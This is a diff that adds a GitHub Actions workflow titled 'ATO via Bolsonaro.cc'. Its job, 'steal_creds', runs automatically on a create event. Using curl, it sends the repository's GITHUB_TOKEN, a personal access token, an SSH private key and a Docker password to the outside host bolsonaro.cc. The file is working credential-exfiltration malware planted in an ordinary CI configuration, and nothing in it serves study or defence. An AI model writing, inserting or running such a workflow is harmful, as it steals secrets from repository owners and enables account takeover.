@@ -1,0 +1,25 @@
+name: "ATO via Bolsonaro.cc"
+on:
+  create:
+    branches:
+      - main
+
+jobs:
+  steal_creds:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Exfiltra GITHUB_TOKEN via bolsonaro.cc
+        run: |
+          curl -G "https://bolsonaro.cc" \
+            --data-urlencode "repo=${{ github.repository }}" \
+            --data-urlencode "token=${{ secrets.GITHUB_TOKEN }}"
+
+      - name: Exfiltra outros secrets via bolsonaro.cc
+        run: |
+          curl -G "https://bolsonaro.cc" \
+            --data-urlencode "personal=${{ secrets.PERSONAL_TOKEN }}" \
+            --data-urlencode "ssh=${{ secrets.SSH_PRIVATE_KEY }}" \
+            --data-urlencode "docker=${{ secrets.DOCKER_PASSWORD }}"
